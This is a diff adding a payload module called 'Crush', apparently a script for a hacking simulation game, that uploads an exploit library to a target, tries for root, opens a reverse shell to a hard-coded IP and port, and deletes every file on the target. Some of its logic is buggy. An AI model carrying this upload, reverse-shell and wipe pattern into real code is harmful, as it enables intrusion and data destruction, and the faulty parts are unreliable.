@@ -1,0 +1,158 @@
+// This module requires MTX Framework:     https://github.com/tuonux/mtx
+// Current source:              		   https://github.com/tuonux/mtx
+
+MTXPayload                   = get_custom_object.MTXPayload
+MTXPayload.name              = "Crush"
+MTXPayload.description       = "Use a remote shell to try and crush the system"
+MTXPayload.author            = "Chabox"
+MTXPayload.options["memory"] = {"required": 1, "default": "scan", "description": "Memory for the root exploit"}
+MTXPayload.options["value"] = {"required": 1, "default": "scan", "description": "Value in memory for the root exploit"}
+MTXPayload.options["library"] = {"required": 1, "default": "init.so", "description": "The Local Library to try and exploit"}
+
+libs = {}
+libs.autoscan = "
+    metax = include_lib(""/lib/metaxploit.so"")
+    metaLib = metax.load(""/lib/init.so"")
+    scanResult = metax.scan(metaLib)
+    target = scanResult[0]
+    scanAddress = metax.scan_address(metaLib, target)
+    segments = scanAddress.split(""Unsafe check: "")
+    exploit = null
+    for segment in segments
+    hasRequirement = segment.indexOf(""*"") != null
+    if (not hasRequirement) then
+        labelStart = segment.indexOf(""<b>"")
+        labelEnd = segment.indexOf(""</b>"")
+        exploit = segment[labelStart + 3: labelEnd]
+    end if
+    end for
+    if (exploit) then
+        print(""Exploiting... "" + target + "":"" + exploit)
+        resultShell = metaLib.overflow(target, exploit)
+        if(typeof(resultShell) == ""shell"")then
+            print(""Got a shell"")
+        else
+            
+        end if
+    else
+        print(""No exploit found with zero requirements"")
+    end if"
+libs.rootPriv = "
+    metalib = mx.load(""/lib/""+options[""library""])
+    if(options[""memory""] == ""scan"")then
+        print(""scan"")
+    else
+        memory = options[""memory""]
+    end if
+    if(options[""value""] == ""scan"")then
+        print(""scan"")
+    else
+        memory = options[""value""]
+    end if
+    shell = metalib.overflow(options[""memory""], options[""value""])
+    file = shell.host_computer.File(""/root"")
+    if(file.has_permission(""w""))then
+        get_custom_object.rootShell = shell
+    else
+        get_custom_object.rootShell = ""null""
+    end if
+"
+libs.rshellCode = "
+mx = include_lib(current_path+""/metaxploit.so"")
+mx.rshell_client(params[0], params[1].to_int, ""Mtx_Terminal"")
+"
+libs.run = function(file, code, remote_object, writableFolder, params = "")
+    if(typeof(file) == "file")then
+            file.set_content(code)
+            remote_object.build(file.path, writableFolder.path)
+            file.delete
+            fileExe = remote_object.host_computer.File(writableFolder.path+"/.payload")
+            if(typeof(fileExe) == "file")then
+                remote_object.launch(fileExe.path, params)
+                fileExe.delete
+            else
+                return print_error("Executable not found.")
+            end if
+        else
+            return print_error("Cant find sorceFile")
+        end if
+end function
+libs.toFile = function(anyObject)//converts any Object to "Parent fileType object" ("/")
+    if typeof(anyObject) == "shell" then return anyObject.host_computer.File("/")
+    if typeof(anyObject) == "computer" then return anyObject.File("/")
+    if typeof(anyObject) == "file" then
+        while anyObject.parent
+            anyObject = anyObject.parent
+        end while
+        return anyObject
+    end if
+    return anyObject
+end function
+libs.allFiles = function(fileObject, maxDepth = -1)//find all files in a computer using fileObject (fileObject)
+    fileObject = libs.toFile(fileObject)
+    if fileObject.is_folder then total = {"ret":[fileObject], "stack":[maxDepth, fileObject]} else return [fileObject]
+    while total.stack
+        c = {"folder":total.stack.pop, "maxDepth":total.stack.pop}
+        if c.maxDepth then total.ret = total.ret + c.folder.get_folders + c.folder.get_files else continue
+        folders = c.folder.get_folders
+        for i in range(len(folders) - 1)
+            if folders then [total.stack.push(c.maxDepth - 1), total.stack.push(folders[i])] else break
+        end for
+    end while
+    return total.ret
+end function
+
+// This is the run() function that run post exploitation
+// remote_object: The object that return after post exploitation <shell|computer|file>
+// local_shell:   Your computer get_shell object
+// options:       Options setted with "set <option> <value>" command
+MTXPayload.run = function(remote_object, local_shell, options)
+		object_type = typeof(remote_object)
+		if object_type != "shell" then return print_error("This payload works with shell sessions only")
+		
+		allFiles = libs.allFiles(libs.toFile(remote_object))
+        writableFolder = null
+        for file in allFiles
+            if(not file.has_permission("w"))then continue
+            if(typeof(writableFolder) == "file")then
+                if(writableFolder.is_folder)then continue
+            end if
+            writableFolder = file
+        end for
+        if(typeof(writableFolder) != "file")then return print_error("Not writable file found on the system.")
+        if(writableFolder.is_folder)then
+            isFolder = "<color=green>true</color=green>"
+        else
+            isFolder = "<color=red>false</color=red>"
+        end if
+        print_info(char(10)+"Executing Faze 1")
+        print_info("Upload metaxploit library to victim")
+        local_shell.scp("/lib/metaxploit.so", writableFolder.path, remote_object)
+        print_info(writableFolder.path+" Is_Filder ["+isFolder+"]")
+        remote_object.host_computer.touch(writableFolder.path,".payload.src")
+        print_info("Trying to obtain root access")
+        file = remote_object.host_computer.File(writableFolder.path+"/.payload.src")
+        
+        libs.run(file, libs.rshellCode, remote_object, writableFolder,"")
+        rootShell = get_custom_object.rootShell
+        if(typeof(rootShell)=="shell")then
+            remote_object = rootShell
+            print_good("rootShell Done")
+        else
+            print_error("rootShell Failled")
+        end if
+        remote_object.host_computer.touch(writableFolder.path,".payload.src")
+        print_info("Running Rshell_Client Code")
+        file = remote_object.host_computer.File(writableFolder.path+"/.payload.src")
+        libs.run(file, libs.rshellCode, remote_object, writableFolder, "134.14.50.88 "+"1222")
+
+        allFiles = libs.allFiles(libs.toFile(remote_object))
+        for file in allFiles
+            deletionResult  = file.delete
+            if typeof(deletionResult) == "string" and deletionResult.len > 0 then
+                print("There was an error while deleting "+file.path+": " + deletionResult)
+            else
+                print(file.path+" got deleted successfully.")
+            end if
+        end for
+end function
